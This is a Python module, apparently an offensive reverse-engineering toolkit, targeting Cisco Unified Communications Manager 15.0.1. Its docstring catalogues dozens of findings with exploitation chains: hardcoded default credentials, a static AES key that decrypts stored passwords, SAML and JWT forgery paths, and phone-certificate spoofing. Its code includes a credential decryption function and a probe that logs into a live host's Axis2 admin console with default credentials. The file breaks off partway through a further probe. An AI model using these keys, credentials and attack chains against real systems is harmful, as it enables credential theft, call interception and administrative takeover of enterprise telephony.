"""
cisco_cucm_re.py — Cisco CUCM 15.0.1 reverse engineering module

Target: Cisco Unified Communications Manager (CUCM) 15.0.1.11901-2
Platform: AlmaLinux 8, Informix DB, Apache Tomcat, OpenSAML SSO SP
ISO: UCSInstall_UCOS_15.0.1.11901-2.sha512.iso
RE date: 2026-08-27
Method: Static analysis of ISO-mounted RPM contents

=== ARCHITECTURE ===

  +--------------------------------------------------+
  | AlmaLinux 8 (base OS)                            |
  |   Platform: /usr/local/platform/                 |
  |   CM: /usr/local/cm/                             |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | Apache Tomcat (jakarta-tomcat)                   |
  |   /axl/                 → AXL SOAP API (cm-axl)  |
  |   /platformcom/         → Platform COM API        |
  |   /platform-services/   → Platform services       |
  |   Axis2 bundled in axl.war                       |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | Informix DB (IDS, licensed, /usr/local/cm/db/)  |
  |   ccm_db: all CUCM config (phones, users, routes)|
  |   DB user: ccmuser / ccmuser (ALL PRIVILEGES)    |
  |   DB user: dbaxlweb (AXL API queries)            |
  |   Replication via IDS CDR                        |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | CAPF (/usr/local/cm/bin/capf)                   |
  |   CA for IP phone identity certs (SCEP/PKCS#10)  |
  |   CA creds at /usr/local/cm/.security/CAPF/      |
  |   Encrypted with CCMShellEncryptionUtil -d        |
  +--------------------------------------------------+
       ↓
  +--------------------------------------------------+
  | SSO SP (sso-sp RPM)                              |
  |   OpenSAML 2.6.5 (EOL 2017)                     |
  |   Nimbus JOSE+JWT 4.23 (2016, pre-5.x)          |
  |   samlauthvalve.jar: SAML → Tomcat Principal     |
  |   ssobackend.jar: token issuance + validation    |
  +--------------------------------------------------+

=== FINDINGS SUMMARY ===

CUCM-F1 CRITICAL: Axis2 admin:axis2 hardcoded + hot-deploy → RCE
  File: axl.war → WEB-INF/conf/axis2.xml
  POST /axl/axis2-admin/upload Authorization: Basic admin:axis2 (default)
  hotdeployment=true → .aar or .class hot-load in Tomcat JVM
  Auth filter maps to <url-pattern>/</url-pattern>; /axis2-admin/* may bypass
  Runtime verification needed: does AuthenticationFilter apply to /axis2-admin/?

CUCM-F2 HIGH: platformcom BasicAuthentication localhost bypass
  File: platformcom.war → BasicAuthentication.class
  Bytecode: remoteAddr.equals("127.0.0.1") OR "::1" → skip auth
  Protected endpoints bypass for loopback:
    /api/v1/software/install/*, /api/v1/cluster/software/upgrade/*
    /api/v1/software/reboot/*, /api/v1/certmgr/config/certificate/store
  Unprotected (no filter-mapping): /api/v1/certmgr/config/snapshot/*
  Chain: any SSRF from CUCM host → unauthenticated cluster software/cert control

CUCM-F3 CRITICAL: Hardcoded AES-128 static key in CCMShellEncryptionUtil
  File: cm-ccm/usr/local/cm/bin/CCMShellEncryptionUtil
  BuildID: cfbbb0a3a58cf2b701f335a9ee1fea55cc1f1ab8; ELF PIE, NOT stripped
  nm: 000000000020f308 D _ZN20CCMEncryptionLibrary10_staticKeyE  (D = initialized .data)
  Pointer at 0x20f308 → VA 0xc111 → string: "smetsysocsiccni\x00" (16 bytes)
  Key = "incciscosystems" reversed → Cisco company name backwards
  AES-128-CBC; used as fallback when /usr/local/platform/.security/CCMEncryption/keys/dkey.txt missing
  Decrypts: CAPF CACredentials.txt, ifx.txt (Informix pw), SftpPwCrypt in platformConfig.xml
  POC: from Crypto.Cipher import AES; AES.new(b'smetsysocsiccni\x00', AES.MODE_CBC, iv).decrypt(ct)
  Impact: ANY filesystem read on ANY CUCM 15.0.1 → decrypt all credentials → CAPF CA key compromise
          → forge phone identity certs for all extensions → SRTP call interception at scale

CUCM-F4 HIGH: ccmuser:ccmuser hardcoded Informix DB credential
  File: cm-dbl/usr/local/cm/db/sql/ccmusers.sql line 5
  "create user ccmuser with encrypted password 'ccmuser' in group ccmusers;"
  Group ccmusers: ALL PRIVILEGES on every CUCM table
  TCP:1526 (Informix) → ccmuser:ccmuser → full DB dump

CUCM-F5 CRITICAL: passwordreverse default = AES-CBC(static_key, empty_string) → SIP auth bypass
  File: makedb.sql lines 2016 + 6159 + CCMMigrateUtil analysis
  DEFAULT '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'
  DECRYPTED (using CUCM-F3 static key, confirmed 2026-08-27):
    ct format: IV(16)|AES-CBC(plaintext)
    plaintext = b'' (EMPTY STRING — 16 bytes PKCS7 padding, Match=True)
  Impact: SIP Auth Bypass on all siprealm/applicationuser entries with default passwordreverse
    HA1 = SHA-256(username:realm:'') is trivially computable → unauthorized SIP registration
    Call routing manipulation, trunk spoofing, SIP identity spoofing

CUCM-F6 MEDIUM: Nimbus JOSE+JWT 4.23 (2016) in SSO SP — alg:none risk
  File: sso-sp → nimbus-jose-jwt.jar Bundle-Version: 4.23.0
  Pre-5.x Nimbus: potential PlainJWT acceptance where SignedJWT expected
  alg:none JWT → arbitrary user impersonation in SSO flow
  Pending: ssobackend.jar JWT validation bytecode review

CUCM-F7 CRITICAL: OpenSAML 2.6.5 XSW + SAMLAuthValve always-true auth bypass
  File: sso-sp → opensaml.jar (2.6.5, EOL 2017) + samlauthvalve.jar
  OpenSAML 2.6.5: DOM-based XML signature validation — XSW-1/2 attacks inject unsigned NameID
  SAMLAuthValve.authenticate() bytecode (confirmed):
    - Reads org.apache.catalina.session.USERNAME from session
    - Calls Realm.authenticate(user, "") with EMPTY PASSWORD (constant pool #28 = "")
    - Calls register() then returns TRUE regardless of Realm result (even null principal)
    - iconst_1 at offset 245 — always returns true when username non-null
  Chain: XSW → forged session USERNAME → SAMLAuthValve TRUE → CUCM admin session
  CVSS: 9.1 Critical AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L

CUCM-F8 LOW: log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571
  File: sso-sp → slf4j-log4j12-1.6.1.jar
  JMSAppender requires attacker config control; low standalone severity

CUCM-F9 INFO: dbaxlweb DB username exposed in AXL bytecode
  File: axl.war → AXLAlpha.class string "dbaxlweb"
  Password split: /partB/usr/local/cm/db/ifx.txt encrypted with CCMShellEncryptionUtil static key

CUCM-F10 CRITICAL: SAMLAuthValve.authenticate() returns TRUE regardless of Realm result
  File: sso-sp/samlauthvalve.jar → SAMLAuthValve.class
  Bytecode: iconst_1;ireturn at offset 245 — no null-principal guard before return
  ANY mechanism setting session USERNAME → unconditional TRUE from SAMLAuthValve
  Combined with F7 XSW: unauthenticated admin access

CUCM-F11 HIGH: SAFClientControl inter-cluster passwords decryptable via static key fallback
  File: cm-ccm binary → SAFClientControl::getDecryptedPwd() at VA 0x14e0a90
  Disassembly (2026-08-27):
    call CCMEncryption::CCMEncryption()              // ResetKey → current key
    call CCMEncryption::hexToPassword()              // hex-decode encrypted SAF pw
    call CCMEncryption::DecryptText()                // decrypt
    → on failure: fallback at 0x23da083 calls staticKey() + SetKey(staticKey)
    → retries AES-128-CBC with "smetsysocsiccni\x00"
  SAF credentials in CCMDB_SAFCLIENTSETTINGS.password → inter-cluster trust
  Static key fallback = SAF passwords always extractable from DB dump + static key

=== CCMEncryptionLibrary::Key() fully mapped (2026-08-27) ===
  VA 0x23dba2a in main ccm binary:
  if (dKeyConfig == 0 OR dKeyConfig == 2):
      return _staticKey  → "smetsysocsiccni\x00"  // fresh install = ALWAYS static
  else:
      fopen dkey.txt → fread(64 hex chars) → hexToBytes → _currentKey (32B AES-256)
      return _currentKey
  DecryptText fallback: after all dynamic key attempts → staticKey() → SetKey(staticKey) → retry
  Consequence: static key ALWAYS decrypts any credential encrypted before dkey migration

CUCM-F12 HIGH: pktCap "file" parameter → passphrase disclosure
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 421-586
  GET /pktCap?file=.pktCap.passphrase → FileInputStream("/var/pktCap/.pktCap.passphrase")
  Only "/" blocked in file param; hidden files (no "/" in name) served directly
  DES3 passphrase used by pktCap_protectData openssl cmd: -pass file:/var/pktCap/.pktCap.passphrase
  Confirmed: pktCap_protectData strings include full openssl des3 command template with passphrase path
  Requires: "Standard Packet Sniffer Users" role
  Impact: download passphrase → decrypt ALL /var/pktCap/*.pkt captures offline

CUCM-F13 MEDIUM: pktCap second-order SQLi via remoteUser
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 162-215
  String sql = "...where u.userid='" + request.getRemoteUser() + "' and g.name='Standard Packet Sniffer Users'..."
  CCMRealm sanitizes ' → '' and \ → \\ ONLY; all other metacharacters unsanitized
  Second-order: username from LDAP sync stored unsanitized in enduser.userid → injected into SQL at auth-check time
  FastAccess → Informix → authorization bypass if injection succeeds

CUCM-F14 LOW: pktCap key argument injection into pktCap_protectData
  File: cm-ccm/pktCap.war → pktCap_jsp.class, offset 763-776 + pktCap_protectData binary
  Runtime.exec(String) tokenizes on whitespace → spaces in key param inject extra args
  Binary option string: "epdo:i:k:" (getopt_long); flags e/p/d/o/i/k parsed
  Binary defense: checkForHarmfulMetaChars() blocks $, ;, |, `, (, ), <, >, \, /
  checkFileName() validates -i arg must == "/var/pktCap/.fileinfo" exactly
  Impact: mode-flag injection (e.g. -d for decrypt, -e for encrypt) — no shell injection

CUCM-F15 LOW: pktCap BASIC auth over cleartext HTTP
  File: cm-ccm/pktCap.war → WEB-INF/web.xml
  <transport-guarantee>NONE</transport-guarantee> + <auth-method>BASIC</auth-method>
  Credentials transmitted as base64 without TLS on port 8080
  Chain: on-path sniff pktCap credentials → download .pktCap.passphrase (F12) → decrypt captures

CUCM-F16 HIGH: Phone device cert CN validated via strstr substring match — device identity spoofing
  File: cm-ccm/var/log/active/cm/bin/ccm
  CheckDeviceIDinX509Certificate at VA 0x1c92310:
    1c9236c: call strstr(certCN, deviceID_truncated)  ; SUBSTRING, not strcmp
    1c92374: setne %al  ; 1=match(pass), 0=nomatch(reject)
  Device ID truncated to 16 bytes before comparison (mov $0x10,%edx at 0x1c92351)
  Only caller: UnicastBridgeControl::wait_register_StationRegister at VA 0x1934db2
    → 0x1934dca: jne 0x1934f70  ; match → ValidateCipher(3) → proceed to registration
    → else: StationOutputRegisterRejectC1; log "missmatch in devcie name and X509 Name in certificate"
  Attack: cert with CN containing victim device ID as substring passes check
    e.g., certCN="EVIL-SEP001122334455" → strstr(certCN,"SEP001122334455") = non-null → PASS
  Chain with F3: static AES key → decrypt CAPF CA key → forge cert with embedded victim device ID
    → register as victim phone → steal registration, intercept calls, SRTP session takeover
  CVSS: 8.1 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F20 LOW: Development JDBC credential in dbl2j.jar TimedPingPrimary.main() — shipped in production
  File: cm-dbl/dbl2j.jar → com.cisco.ccm.dbl.TimedPingPrimary.main()
  Bytecode offset 46 (ldc #63): "jdbc:informix-sqli://nw096a-93:1500/ccm0500v0001:informixserver=nw096a_93_ccm;user=dbuser;password=42lj5i"
  Only in main() test entry point — Cisco internal dev environment (CUCM 5.0 era)
  Non-production credential; confirms dbuser username; reveals internal Cisco infrastructure names
  CVSS: LOW — test credential for long-gone internal Cisco host

CUCM-F22 MEDIUM: IMS LDAP/LDAPS TLS hostname verification disabled — Active Directory MITM
  File: cm-authentication/IMS.jar → com.cisco.security.ims.impl.AuthenticationLDAP.makeConnection()
  Bytecode evidence (constant pool):
    #54 = String // com.sun.jndi.ldap.object.disableEndpointIdentification
    #55 = String // com.sun.jndi.ldap.object.disableEndpointIdentification  (set twice in SSL path)
    #59 = String // ssl  (java.naming.security.protocol value)
    #60 = String // java.naming.ldap.factory.socket
    #61 = Class  // com/cisco/security/ims/impl/CustomSocketFactory
  Config evidence (cm-dirsync/CCMDirSyncCfg.xml):
    <VmParam Param="-Dcom.sun.jndi.ldap.object.disableEndpointIdentification=true" />
  CustomSocketFactory amplification:
    createSocket(String host, int port) → null  (parametrized overloads all return null)
    createSocket(InetAddress, int, InetAddress, int) → null
    createSocket(String, int, InetAddress, int) → null
    Only createSocket() (no-arg) works — LDAPS connections using this factory fail unless JVM fallback occurs
  Attack chain:
    on-path attacker between CUCM and AD (TCP/636) → intercept LDAPS connection
    → present any cert from a CUCM-trusted CA for ANY hostname (hostname check disabled)
    → TLS session established with attacker endpoint → receive LDAP BIND with plaintext DN + password
    → same impact as F21 but via network interception vs static key decryption
  Combined chain (F3 → F21 → F22):
    F21: static key decrypts stored ciphertext → plaintext bind password obtained offline
    F22: hostname check disabled → MITM intercepts bind credential in transit
    Both converge to full AD enumeration
  Distinction from F17 (platform-api trust-all):
    F22 does NOT use trust-all TrustManager — system truststore IS validated
    Attack bar: obtain a cert from ANY CUCM-trusted CA for ANY hostname (not forge a self-signed cert)
    Enterprise CUCM commonly ships with internal CA certs → internal CA operator = attacker threshold
  CVSS: 6.5 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

CUCM-F21 HIGH: LDAP Manager bind password decryptable via F3 static AES key — Active Directory access
  File: cm-ccm binary → authenticationLDAPConfig::readLDAPServerDetailsFromDB() at VA 0x2331746
  Disassembly — CCMEncryption call chain:
    0x2331e47: call CCMEncryptionC1()      ; construct CCMEncryption (uses F3 static key fallback)
    0x2331eb2: call hexToPassword()        ; hex-decode ciphertext from ldapauthentication.ldappassword
    0x2331f2c: call DecryptText()          ; AES-CBC decrypt → plaintext LDAP Manager bind password
    0x2331f47: movq $0x0,0x418(%r12)       ; reset pConfig.ldapManagerPW before store
  DB schema: cm-dbl/makedb.sql
    ldapauthentication.ldappassword LVARCHAR(401) DEFAULT '' NOT NULL
  Default ciphertext (typefieldinfo DirectoryPluginConfig.LdapPassword):
    9e1cb76005b4b718276f4f3662d11f4474dbf844c91298f70fa00d71a9151211
  Decryption (confirmed Python 2026-08-27):
    KEY = b'smetsysocsiccni\x00'  (F3 static key)
    IV  = 9e1cb76005b4b718276f4f4662d11f44  (first 16 bytes)
    PT  = b''  (empty string — same as F5 passwordreverse pattern)
    Re-encrypt match: True
  Attack chain:
    F4 (ccmuser:ccmuser) → SELECT ldapdn,ldappassword FROM ldapauthentication
    F3 static key → AES_128_CBC_decrypt(ldappassword) → plaintext bind password
    ldap_simple_bind_s(ldap_server, ldapdn, plaintext_pw) → full AD enumeration
    Default case: empty pw → anonymous LDAP bind may succeed on many AD servers
  Note: F21 is the direct impact path from F3 to enterprise Active Directory.
  Enterprise CUCM deployments use LDAP integration universally → near-universal applicability.
  CVSS: 8.6 High AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (scoped: C:H because reads entire AD tree)

CUCM-F19 HIGH: platform-services.war Axis2 admin UI exposed without auth (admin:axis2, hotdeployment=true)
  File: platform-api/platform-services.war → WEB-INF/conf/axis2.xml + WEB-INF/web.xml
  axis2.xml: userName=admin, password=axis2, hotdeployment=true (confirmed)
  web.xml: security-constraint covers /services/* ONLY; axis2-web/ NOT covered
  AxisAdminServlet defined but NO servlet-mapping → hot-deploy via upload.jsp currently blocked
  Accessible without auth: admin.jsp, Login.jsp, upload.jsp, listServices.jsp, HappyAxis.jsp
  If AxisAdminServlet mapping added → CRITICAL (same as F1 but different WAR/endpoint)
  Pattern identical to F1 (axl.war) with same admin:axis2 default credential
  CVSS: 8.1 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CUCM-F18 MEDIUM: AXL SQL Toolkit trust-all TrustManager + JVM-global HostnameVerifier bypass
  File: cm-axlsqltoolkit/axlsqltoolkit.zip → src/AxlSqlToolkit.java (SOURCE INCLUDED)
  MyTrustManager inner class (lines 281-288):
    checkClientTrusted(): empty; checkServerTrusted(): empty; getAcceptedIssuers(): null
  init() sets JVM-global bypass:
    HttpsURLConnection.setDefaultSSLSocketFactory(sf)                   <- ALL HTTPS in JVM
    HttpsURLConnection.setDefaultHostnameVerifier(() -> return true)    <- always-true, JVM-global
  Endpoint: https://host:8443/axl/ — Basic Auth credentials interceptable via MITM
  Impact: AXL credentials have executeSQLQuery/executeSQLUpdate → full DB dump
  Same pattern as ASA/ASDM F8 (efw JVM-global SSL bypass); distinction: CLI tool vs persistent service
  CVSS: 6.8 Medium AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N

CUCM-F17 HIGH: Platform API SOAP client trust-all X509TrustManager — inter-cluster cert/key MITM
  File: platform-api.jar → com.cisco.vos.platform.api.soapclient.SSLProtocolSocketFactory$1
  Anonymous inner class implements javax.net.ssl.X509TrustManager:
    checkClientTrusted(X509Certificate[], String): Code 0: return  <- empty, no validation
    checkServerTrusted(X509Certificate[], String): Code 0: return  <- empty, no validation
    getAcceptedIssuers(): Code 0: aconst_null; 1: areturn          <- null (accepts all)
  SSLProtocolSocketFactory.getTrustManager() returns this trust-all instance
  SSLContext.init(null, getTrustManager(), null) — all HTTPS SOAP connections unvalidated
  Affected clients: CertificateCsrAndDataExportServiceClient, APIVersionServiceClient
  Impact: on-path attacker on cluster mgmt network → MITM SOAP → intercept private key exports
  Pattern identical to ASA/ASDM F6 (class av trust-all TrustManager)
  CVSS: 7.4 High AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N

CUCM-F23 MEDIUM: CiscoRA EST Proof of Possession disabled — phone cert enrollment without key ownership
  File: cm-security/usr/local/thirdparty/nginx/install/conf/nginx.conf
  Config: est_pop off;   (RFC 7030 §4.2 requires PoP for non-EAP enrollments)
  Attack: capture phone CSR during simpleenroll request → re-submit without possessing private key
          → CA issues cert bound to phone identity without proof of key ownership
  Amplification: F24 NTLM relay controls which CSR gets approved → full phone identity manufacturing
  CVSS: 5.9 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N

CUCM-F24 MEDIUM: CiscoRA EST NTLM auth relay to Windows CA — phone cert issuance via NTLM relay
  File: cm-security/usr/local/thirdparty/nginx/install/conf/nginx.conf
  Config:
    est_certsrv_auth_method NTLM;
    est_certsrv_ca_auth_method NTLM;
    est_certsrv_auth_server WIN-EJSG9DN4GS6;
    est_certsrv_auth_html_check off;    (removes HTML response integrity check)
    est_certsrv_ca_html_check off;
  Attack: intercept CiscoRA outbound NTLM auth to Windows CA (HTTPS:443) → relay NTLM credential
          → authenticate as CiscoRA service account → approve arbitrary CSRs via Windows CA API
  With F23 (PoP disabled): attacker can both intercept CSRs AND relay CA auth → full identity manufacturing
  CVSS: 6.5 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N

CUCM-F25 LOW: Hardcoded development hostname WIN-EJSG9DN4GS6 in production CiscoRA nginx.conf
  File: cm-security/usr/local/thirdparty/nginx/install/conf/nginx.conf
  Config: est_certsrv_auth_server WIN-EJSG9DN4GS6; est_certsrv_server WIN-EJSG9DN4GS6;
          est_trusted_certs .../CAPF/certs/WIN-EJSG9DN4GS6.pem (lab CA cert ships with ISO)
  Impact: lab CA cert distributed to all CUCM 15.0.1 → anyone with lab CA key can be trusted by CiscoRA
          EST enrollment non-functional in customer environments (silent config failure)

CUCM-F26 INFO: Developer GDB extension spy.py ships in production ISO
  File: cm-ccm/common/spy.py
  Content: "Stephen's GDB Python Helper (SPY)"; IMDB = "CCMDB"
  Exposes: internal DB name (corroborates F4/F9), CUCM data structure internals, named developer
  Impact: informational — confirms CCMDB name, assists binary RE, developer identity for social engineering

CUCM-F27 MEDIUM: SAML SP AuthnRequests unsigned by default — forged IdP redirects
  File: sso-sp/usr/local/platform/sso/saml/conf/ssoconfig.properties line 56
  Config: metadata_auth_request_signed=false
  Bytecode (SPMetadataController constructor):
    offset 124-134: METADATA_AUTH_REQUEST_SIGNED = ssoCP.getPropertyValue("metadata_auth_request_signed") → "false"
    offset 232-238: setAuthnRequestsSigned(Boolean.valueOf("false")) → false
  Impact: IdP cannot verify AuthnRequest origin; combined with F7 XSW + F10 always-true → forged
    AuthnRequest → forged SAML response → unconditional admin auth bypass
  CVSS: 5.3 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N

CUCM-F28 LOW: SAML SP metadata and assertion signing disabled — SP spoofing surface
  File: sso-sp/usr/local/platform/sso/saml/conf/ssoconfig.properties lines 57, 63
  Config: metadata_assertion_signed=false; sp_md_signed=false
  Impact: SP metadata (sp.xml) unsigned → IdP cannot verify metadata integrity; substituted metadata
    → IdP routes SAML responses to attacker ACS. Requires admin/filesystem write access. Amplifies F7/F10.

CUCM-F29 MEDIUM: CCMAsymmetricEncryption uses RSA/ECB/PKCS1PADDING (PKCS#1 v1.5, deprecated)
  File: cm-asymencryption/com/cisco/ccm/security/CCMAsymmetricEncryption.class
  Constant pool #9: "RSA/ECB/PKCS1PADDING"
  Bytecode: rsaAsymPubEnc() uses PKCS1 at offset 12 (FIPS/BCFIPS path) and offset 77 (non-FIPS)
  Local var rsaOAEPEncrypter (slot 3) stores PKCS1 Cipher — OAEP migration started but never completed
  NIST SP 800-131A Rev2: PKCS#1 v1.5 encryption disallowed after 2023; Bleichenbacher oracle susceptibility
  Affected: CAPF phone cert enrollment, inter-cluster token encryption, OAuth token RSA wrapping
  CVSS: 5.9 Medium AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N

CUCM-F30 MEDIUM: CallManager RSA private key passphrase stored in plaintext at predictable path
  File: cm-security/libCryptoUtil.so → CreatePrivateKeyPassPhraseInLocalStore() at 0x1772
  Path: /usr/local/cm/.security/CallManager/keys/CallManager.passphrase
  CreatePrivateKeyPassPhraseInLocalStore(): fopen("w") → GetRandonPassPhrase(10 bytes) → fwrite() (NO encrypt)
  GetPrivateKeyPassPhraseFromLocalStore(): fopen("r") → fread() byte-by-byte (NO decrypt) → raw return
  GetRandonPassPhrase(): RAND_bytes(10) → 56-char alphabet [A-x] → 57.5 bits entropy
  Contrast: CAPF creds use CCMShellEncryptionUtil AES-CBC; CallManager passphrase has no encryption layer
  Chain: any file-read exploit → CallManager.passphrase → decrypt CallManager_priv.pem → SRTP MITM
  CVSS: 5.5 Medium AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

CUCM-F31 CRITICAL: F3 static key decrypts Windows CA service account credentials + FIPS SSM PIN
  File: cm-capf/usr/local/bin/base_scripts/EnrollmentService.sh
  Sources:
    CACredentials.txt L1: AES-CBC(F3_key, CA_service_account_username)
    CACredentials.txt L2: AES-CBC(F3_key, CA_service_account_password)  ← Windows domain creds
    TAM_PWD_FILE L1:      AES-CBC(F3_key, ssm_pin)                      ← FIPS module unlock PIN
  Decryption: sudo CCMShellEncryptionUtil -d $CA_UserName_Encrypted → plaintext Windows domain user
              sudo CCMShellEncryptionUtil -d $CA_Pwd_Encrypted       → plaintext Windows domain password
              sudo CCMShellEncryptionUtil -d $TAM_Pwd_Encrypted      → plaintext FIPS SSM PIN
  Written to ciscoRA_config_file: msca-user-id, msca-password, ssm-pin (plaintext, deleted after nginx reads)
  Chain:
    F3 key → decrypt CACredentials.txt → Windows CA domain user:password
    → authenticate to ADCS → issue certs for any SIP extension → forge phone identity
    → lateral movement: CA service accounts often have elevated AD privileges
    F3 key → decrypt TAM_PWD_FILE → FIPS SSM PIN → unlock BCFIPS module → recover CAPF CA key
  Scope: all CUCM deployments with Online CA mode (CAPFCertGenMethod=4, ONLINE_CA_TYPE=2) + Windows ADCS
  CVSS: 9.1 Critical AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

CUCM-F33 CRITICAL: Hardcoded OpenAM encryption password in FederationConfig.properties
  File: sso_sp/usr/local/platform/sso/saml/metadata/FederationConfig.properties
  Key: am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2  (same across ALL CUCM installations)
  Decoder: com.sun.identity.saml.xmlsig.passwordDecoder=com.sun.identity.fedlet.FedletEncodeDecode
  Affected secrets:
    storepass: /usr/local/platform/.security/tomcat/keys/tomcat.passphrase (SAML JKS password)
    keypass:   /usr/local/platform/.security/tomcat/keys/tomcat.passphrase (SAML signing key password)
  Chain:
    am.encryption.pwd → FedletEncodeDecode.decode(tomcat.passphrase) → JKS password
    → unlock tomcat.keystore → extract SAML SP signing private key
    → forge SAML assertions for any user → authenticate as admin
    → also: unlock Tomcat HTTPS private key → TLS MITM all CUCM web interfaces
  Context: F3 covers CCMEncryption (CallManager subsystem); F33 covers OpenAM/Fedlet (SSO subsystem)
    Two independent hardcoded keys across two orthogonal credential stores
  CVSS: 9.1 Critical AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (key is public from ISO; no auth needed)

CUCM-F32 CRITICAL: F3 static key decrypts OAuth JWT signing + encryption keys in authzkeys DB table
  File: ims/com/cisco/security/ims/authentication/GetAuthzKeys.class
  SQL: select keyid, keyvalue, tkpurpose from authzkeys
  tkpurpose=1: symmetric AES token encryption key → CCMEncryption.decryptPassword() → base64 decode → TokenKeys.symmetricKey
  tkpurpose=2: RSA signing private key → CCMEncryption.decryptPassword() → readPrivateKey() → TokenKeys.verificationKey
  decryptKey() bytecode: new CCMEncryption; hexToByte(encryptedHex); decryptPassword([B)
  Same CCMEncryption class as F3 (static key smetsysocsiccni)
  Key paths: authz_priv.pem, authz_symmetric_Key → /usr/local/platform/.security/authz/keys/
  Chain:
    F3 key → CCMEncryption.decryptPassword(authzkeys.keyvalue)
    → plaintext RSA signing private key
    → forge JWT: header.payload.RS256_sign(priv_key)
    → Authorization: Bearer <forged_token>
    → BearerAuthenticationRequestHandler.authenticate() → AuthenticationImpl.validateAccessToken()
    → authenticated as any CUCM user (admin, operator, or end user)
  Access vector: read authzkeys table via F4 (ccmuser:ccmuser Informix) or F1 RCE filesystem read
  Downstream: all OAuth-protected CUCM REST APIs, Jabber SSO, Webex integration, UCCX agent sessions
  CVSS: 9.1 Critical AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N

=== PENDING TASKS ===
- ssobackend.jar JWT validation path RE (F6) — CLOSED (SignedJWT.parse blocks alg:none)
- Nimbus JOSE+JWT CVE mapping for 4.23 build
- ccm binary: RADIUS integration deeper analysis
- CTLCli chain finding: F1/F7 RCE → read CallManager_priv.pem → forge signed TFTP configs
- libCryptoUtil.so from cm-security: hardcoded keys
"""

VERSION = "2.5.0"

import requests
import urllib3
import struct
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── FINGERPRINT STRINGS ─────────────────────────────────────────────────────

CUCM_TITLE_MARKERS = [
    b'Cisco Unified CM Administration',
    b'ccmadmin',
    b'cuicauthentication',
    b'CUCM',
    b'Unified Communications Manager',
]

AXL_AXIS2_DEFAULT_CRED = ('admin', 'axis2')

CUCM_INFORMIX_DEFAULT_CRED = ('ccmuser', 'ccmuser')

DEFAULT_PASSWORDREVERSE_HASH = '69c4f936f9cdf45f6bbca2570c31215629bb5d6fb97493478b8ff3db6fffbc55'

# CUCM-F3: Hardcoded static AES-128 key in CCMShellEncryptionUtil
# Extracted from cm-ccm/CCMShellEncryptionUtil binary .data section:
#   nm: D _ZN20CCMEncryptionLibrary10_staticKeyE @ VA 0x20f308
#   Pointer at 0x20f308 → string at VA 0xc111 = b'smetsysocsiccni\x00'
# "incciscosystems" reversed. Universal across all CUCM 15.0.1 installations.
CCM_STATIC_ENCRYPTION_KEY = b'smetsysocsiccni\x00'  # 16 bytes AES-128

# CUCM-F1: AuthenticationFilter maps to <url-pattern>/</url-pattern> (confirmed web.xml)
# Axis2AdminServlet maps to /axis2-admin/* — filter does NOT apply
# CVSS 9.8 Critical — unauthenticated Axis2 admin accessible with default admin:axis2
AXL_AXIS2_ADMIN_PATH = '/axl/axis2-admin/'
AXL_AXIS2_UPLOAD_PATH = '/axl/axis2-admin/upload'

# ─── PROBES ──────────────────────────────────────────────────────────────────

def decrypt_cucm_credential(hex_ciphertext: str, key: bytes = CCM_STATIC_ENCRYPTION_KEY) -> dict:
    """
    Decrypt a CCMShellEncryptionUtil-encrypted credential using the hardcoded static key.
    CUCM-F3: key = b'smetsysocsiccni\x00' AES-128-CBC.
    hex_ciphertext: hex string output of CCMShellEncryptionUtil -e
    """
    import binascii
    try:
        from Crypto.Cipher import AES
    except ImportError:
        return {"error": "pycryptodome not installed: pip install pycryptodome"}
    try:
        ct = binascii.unhexlify(hex_ciphertext.strip())
        if len(ct) < 16:
            return {"error": "ciphertext too short"}
        # CCM encryption: IV may be first 16 bytes or all-zero — try both
        results = {}
        for iv_source in ['first_16', 'zero']:
            try:
                if iv_source == 'first_16' and len(ct) > 16:
                    iv = ct[:16]; body = ct[16:]
                else:
                    iv = b'\x00' * 16; body = ct
                cipher = AES.new(key, AES.MODE_CBC, iv)
                pt = cipher.decrypt(body)
                pad_len = pt[-1] if pt[-1] <= 16 else 0
                plaintext = pt[:-pad_len].decode('utf-8', errors='replace') if pad_len else pt.decode('utf-8', errors='replace')
                results[iv_source] = plaintext.rstrip('\x00')
            except Exception as e:
                results[iv_source] = f"error: {e}"
        return {"finding": "CUCM-F3", "key": key.hex(), "results": results}
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F3"}


def probe_axis2_admin(host: str, port: int = 8443) -> dict:
    """Probe Axis2 admin console for default admin:axis2 credential (CUCM-F1)."""
    url = f"https://{host}:{port}/axl/axis2-admin/"
    import base64
    cred = base64.b64encode(b'admin:axis2').decode()
    try:
        r = requests.get(url, headers={"Authorization": f"Basic {cred}"},
                        verify=False, timeout=10, allow_redirects=False)
        return {
            "status":   r.status_code,
            "finding":  "CUCM-F1",
            "note":     ("200 = Axis2 admin accessible with default admin:axis2"
                         if r.status_code == 200 else
                         "Non-200: auth filter may be covering /axis2-admin/"),
            "hotdeploy": "true" in r.text.lower() if r.status_code == 200 else "unknown",
        }
    except Exception as e:
        return {"error": str(e), "finding": "CUCM-F1"}


def probe_platformcom_localhost_bypass(host: str, port: int = 8443,
                                        internal_ip: str = "127.0.0.1") -> dict:
    """
    Probe platformcom software endpoints for localhost bypass (CUCM-F2).
